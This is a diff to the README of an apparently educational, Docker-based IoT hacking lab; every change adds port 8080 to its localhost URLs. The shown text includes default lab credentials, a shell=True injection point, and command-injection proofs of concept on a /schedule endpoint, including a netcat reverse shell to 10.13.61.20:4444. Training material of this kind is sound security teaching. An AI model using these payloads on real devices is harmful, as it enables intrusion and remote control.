@@ -11,7 +11,7 @@ No physical hardware needed.
 docker compose up --build -d
 ```
 
-Open **http://localhost/lab** to see the split-screen view:
+Open **http://localhost:8080/lab** to see the split-screen view:
 
 - **Left - Target UART:** the device debug serial console
 - **Right - Attacker shell:** your machine
@@ -22,7 +22,7 @@ Open **http://localhost/lab** to see the split-screen view:
 
 | What | Username | Password |
 |------|----------|----------|
-| Web interface (`http://localhost/`) | `admin` | `admin` |
+| Web interface (`http://localhost:8080/`) | `admin` | `admin` |
 | UART login | `root` | `tcm` |
 
 Default credentials are one of the most common findings in real IoT assessments.
@@ -74,7 +74,7 @@ subprocess.run(cmd, shell=True)
 **Proof of concept:**
 
 ```
-http://localhost/schedule?time=bad" %26 id"
+http://localhost:8080/schedule?time=bad" %26 id"
 ```
 
 > `&` must be written as `%26` in the URL. A bare `&` in a query string is
@@ -119,13 +119,13 @@ Netcat opens a TCP listener on port 4444 and waits for the device to connect.
 The payload URL-encoded (use this in the browser):
 
 ```
-http://localhost/schedule?time=bad%22%20%26%20nc%2010.13.61.20%204444%20-e%20/bin/bash%22
+http://localhost:8080/schedule?time=bad%22%20%26%20nc%2010.13.61.20%204444%20-e%20/bin/bash%22
 ```
 
 The same payload decoded (do NOT paste this directly in the browser, it will not be interpreted correctly):
 
 ```
-http://localhost/schedule?time=bad" & nc 10.13.61.20 4444 -e /bin/bash"
+http://localhost:8080/schedule?time=bad" & nc 10.13.61.20 4444 -e /bin/bash"
 ```
 
 What the injected shell command does:
